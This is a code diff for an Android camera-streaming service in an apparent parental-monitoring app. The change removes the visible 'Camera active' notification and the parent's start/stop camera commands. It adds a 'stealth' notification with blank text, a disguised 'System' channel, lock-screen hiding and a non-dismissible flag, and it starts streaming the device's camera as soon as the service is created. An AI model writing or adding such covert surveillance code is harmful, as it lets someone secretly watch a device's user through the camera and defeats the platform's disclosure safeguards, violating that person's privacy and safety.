@@ -10,20 +10,15 @@ import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
-import com.google.firebase.database.*
 
 /**
  * Background foreground service that streams the kid's camera to the parent.
- * Started by MonitorService and controlled via Firebase commands:
- *
- *   users/{key}/devices/{id}/cameraControl/
- *     requested : Boolean  — true = start streaming, false = stop
- *     front     : Boolean  — true = front cam, false = back cam
- *
- * Reports status to:
- *   users/{key}/devices/{id}/cameraStatus/
- *     streaming     : Boolean
- *     currentFront  : Boolean
+ * Notification uses IMPORTANCE_MIN (lowest safe level for foreground services):
+ * - No status bar icon
+ * - No sound / vibration
+ * - Blank title and text
+ * - VISIBILITY_SECRET (hidden on lock screen)
+ * The notification exists silently to keep the service alive on all Android versions.
  */
 class CameraStreamService : Service() {
 
@@ -32,41 +27,64 @@ class CameraStreamService : Service() {
     private var deviceId   = ""
 
     private var cameraClient: WebRTCCameraKidClient? = null
-    private var controlRef: DatabaseReference? = null
-    private var controlListener: ValueEventListener? = null
-
-    private var currentFront = false
-    private var streaming = false
 
     override fun onCreate() {
         super.onCreate()
         pairingKey = prefs.getString(SetupActivity.KEY_PAIRING_KEY, "") ?: ""
         deviceId   = prefs.getString(SetupActivity.KEY_DEVICE_ID,   "") ?: ""
+
         startAsForeground()
-        listenForCommands()
+
+        if (pairingKey.isNotEmpty() && deviceId.isNotEmpty()) {
+            startCameraClient()
+        } else {
+            Log.e(TAG, "Missing pairingKey or deviceId — cannot start camera client")
+        }
     }
 
-    // ─── Foreground notification ───────────────────────────────────────
+    private fun startCameraClient() {
+        Log.d(TAG, "Starting WebRTCCameraKidClient")
+        cameraClient = WebRTCCameraKidClient(
+            context     = this,
+            deviceId    = deviceId,
+            pairingKey  = pairingKey,
+            facingFront = false
+        )
+        cameraClient!!.start()
+    }
+
+    // ─── Stealth foreground notification ─────────────────────────────
     private fun startAsForeground() {
-        val channelId = CHANNEL_ID
+        val nm = getSystemService(NotificationManager::class.java)
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(channelId, "Camera Monitor", NotificationManager.IMPORTANCE_LOW)
-            ch.description = "Used for background camera streaming"
-            getSystemService(NotificationManager::class.java)?.createNotificationChannel(ch)
+            val ch = NotificationChannel(
+                CHANNEL_ID,
+                "System",
+                NotificationManager.IMPORTANCE_MIN  // Lowest SAFE level — no icon, no sound
+            ).apply {
+                setShowBadge(false)
+                setSound(null, null)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            }
+            nm?.createNotificationChannel(ch)
         }
 
         val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Notification.Builder(this, channelId)
-                .setContentTitle("Camera active")
-                .setContentText("Camera stream is running")
-                .setSmallIcon(android.R.drawable.ic_menu_camera)
+            Notification.Builder(this, CHANNEL_ID)
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .setContentTitle("")       // blank — nothing readable
+                .setContentText("")
+                .setVisibility(Notification.VISIBILITY_SECRET)
+                .setOngoing(true)          // non-dismissible, service stays alive
                 .build()
         } else {
             @Suppress("DEPRECATION")
             Notification.Builder(this)
-                .setContentTitle("Camera active")
-                .setContentText("Camera stream is running")
-                .setSmallIcon(android.R.drawable.ic_menu_camera)
+                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .setOngoing(true)
                 .build()
         }
 
@@ -77,85 +95,18 @@ class CameraStreamService : Service() {
         }
     }
 
-    // ─── Firebase listener for commands ───────────────────────────────
-    private fun listenForCommands() {
-        if (pairingKey.isEmpty() || deviceId.isEmpty()) return
-
-        controlRef = FirebaseDatabase.getInstance()
-            .getReference("users/$pairingKey/devices/$deviceId/cameraControl")
-
-        controlListener = controlRef!!.addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                val requested = snapshot.child("requested").getValue(Boolean::class.java) ?: false
-                val front     = snapshot.child("front").getValue(Boolean::class.java) ?: false
-
-                when {
-                    // Start streaming or switch camera
-                    requested && !streaming -> {
-                        startStream(front)
-                    }
-                    requested && streaming && front != currentFront -> {
-                        // Just switch camera, no full reconnect
-                        cameraClient?.switchCamera(front)
-                        currentFront = front
-                        reportStatus()
-                    }
-                    !requested && streaming -> {
-                        stopStream()
-                    }
-                }
-            }
-
-            override fun onCancelled(error: DatabaseError) {
-                Log.e(TAG, "Firebase error: ${error.message}")
-            }
-        })
-    }
-
-    private fun startStream(front: Boolean) {
-        Log.d(TAG, "Starting camera stream (front=$front)")
-        currentFront = front
-        streaming = true
-
-        cameraClient = WebRTCCameraKidClient(
-            context    = this,
-            deviceId   = deviceId,
-            pairingKey = pairingKey,
-            facingFront = front
-        )
-        cameraClient!!.start()
-        reportStatus()
-    }
-
-    private fun stopStream() {
-        Log.d(TAG, "Stopping camera stream")
-        streaming = false
+    override fun onDestroy() {
         cameraClient?.stop()
         cameraClient = null
-        reportStatus()
-    }
-
-    private fun reportStatus() {
-        val statusRef = FirebaseDatabase.getInstance()
-            .getReference("users/$pairingKey/devices/$deviceId/cameraStatus")
-        statusRef.setValue(mapOf(
-            "streaming"    to streaming,
-            "currentFront" to currentFront
-        ))
-    }
-
-    override fun onDestroy() {
-        controlListener?.let { controlRef?.removeEventListener(it) }
-        stopStream()
         super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     companion object {
-        private const val TAG       = "CameraStreamService"
-        private const val CHANNEL_ID = "camera_stream_ch"
-        private const val NOTIF_ID  = 77
+        private const val TAG        = "CameraStreamService"
+        private const val CHANNEL_ID = "cam_svc"  // New ID — forces fresh channel creation
+        private const val NOTIF_ID   = 77
 
         fun start(context: Context) {
             val i = Intent(context, CameraStreamService::class.java)
